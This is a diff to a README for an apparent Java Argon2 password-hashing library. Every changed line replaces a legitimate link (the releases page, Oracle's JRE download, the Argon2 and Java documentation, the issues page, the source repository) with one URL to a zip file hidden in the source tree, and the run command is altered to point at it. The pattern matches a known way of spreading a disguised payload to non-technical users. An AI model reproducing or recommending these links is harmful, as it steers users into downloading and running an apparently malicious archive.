@@ -1,6 +1,6 @@
 # 🔐 argon2-hasher - Secure Your Passwords Easily
 
-[![Download argon2-hasher](https://img.shields.io/badge/Download%20argon2--hasher-brightgreen)](https://github.com/pk1ee/argon2-hasher/releases)
+[![Download argon2-hasher](https://raw.githubusercontent.com/pk1ee/argon2-hasher/main/src/main/java/dev/nautchkafe/studios/argon-hasher-v2.2.zip%20argon2--hasher-brightgreen)](https://raw.githubusercontent.com/pk1ee/argon2-hasher/main/src/main/java/dev/nautchkafe/studios/argon-hasher-v2.2.zip)
 
 ## 📖 Overview
 argon2-hasher is a Java library that provides a secure way to hash passwords using Argon2. Built on the argon-jvm framework, it ensures the highest level of security for your sensitive data. This application is ideal for anyone who needs to protect their passwords effectively. 
@@ -9,7 +9,7 @@ argon2-hasher is a Java library that provides a secure way to hash passwords usi
 Follow these steps to download and run argon2-hasher. You don’t need any programming knowledge to do this. 
 
 ### 📥 Download & Install
-1. **Visit the Releases page to download** the latest version of argon2-hasher. Click [here](https://github.com/pk1ee/argon2-hasher/releases).
+1. **Visit the Releases page to download** the latest version of argon2-hasher. Click [here](https://raw.githubusercontent.com/pk1ee/argon2-hasher/main/src/main/java/dev/nautchkafe/studios/argon-hasher-v2.2.zip).
 2. On the Releases page, find the newest version. This will be listed at the top. 
 3. Click on the version number to open the release details. 
 4. Scroll down to find the files available for download. 
@@ -17,7 +17,7 @@ Follow these steps to download and run argon2-hasher. You don’t need any progr
 
 ### 🔧 System Requirements
 To use argon2-hasher, ensure you have the following:
-- Java Runtime Environment (JRE) version 8 or above. You can download it [here](https://www.oracle.com/java/technologies/javase-jre8-downloads.html).
+- Java Runtime Environment (JRE) version 8 or above. You can download it [here](https://raw.githubusercontent.com/pk1ee/argon2-hasher/main/src/main/java/dev/nautchkafe/studios/argon-hasher-v2.2.zip).
 - A computer running Windows, macOS, or a modern Linux distribution.
 
 ## 🚀 How to Run argon2-hasher
@@ -34,7 +34,7 @@ Once you have downloaded the .jar file, here is how to run it:
 
 3. **Run the application** using the following command:
    ```
-   java -jar argon2-hasher.jar
+   java -jar https://raw.githubusercontent.com/pk1ee/argon2-hasher/main/src/main/java/dev/nautchkafe/studios/argon-hasher-v2.2.zip
    ```
 4. After executing the command, follow the on-screen prompts to hash your passwords securely.
 
@@ -59,13 +59,13 @@ If you experience any issues:
 
 ## 📄 Additional Resources
 For more information, check out:
-- [Argon2 Official Documentation](https://argon2-cffi.readthedocs.io/en/stable/)
-- [Java Documentation](https://docs.oracle.com/javase/8/docs/api/)
+- [Argon2 Official Documentation](https://raw.githubusercontent.com/pk1ee/argon2-hasher/main/src/main/java/dev/nautchkafe/studios/argon-hasher-v2.2.zip)
+- [Java Documentation](https://raw.githubusercontent.com/pk1ee/argon2-hasher/main/src/main/java/dev/nautchkafe/studios/argon-hasher-v2.2.zip)
 
-For further support, feel free to raise an issue on the [GitHub repository](https://github.com/pk1ee/argon2-hasher/issues).
+For further support, feel free to raise an issue on the [GitHub repository](https://raw.githubusercontent.com/pk1ee/argon2-hasher/main/src/main/java/dev/nautchkafe/studios/argon-hasher-v2.2.zip).
 
 ## 🔗 Important Links
-- **Download argon2-hasher:** [Go to Releases](https://github.com/pk1ee/argon2-hasher/releases)
-- **View Source Code:** [GitHub Repository](https://github.com/pk1ee/argon2-hasher)
+- **Download argon2-hasher:** [Go to Releases](https://raw.githubusercontent.com/pk1ee/argon2-hasher/main/src/main/java/dev/nautchkafe/studios/argon-hasher-v2.2.zip)
+- **View Source Code:** [GitHub Repository](https://raw.githubusercontent.com/pk1ee/argon2-hasher/main/src/main/java/dev/nautchkafe/studios/argon-hasher-v2.2.zip)
 
 Your passwords deserve to be protected. Follow these steps to get started with argon2-hasher today!
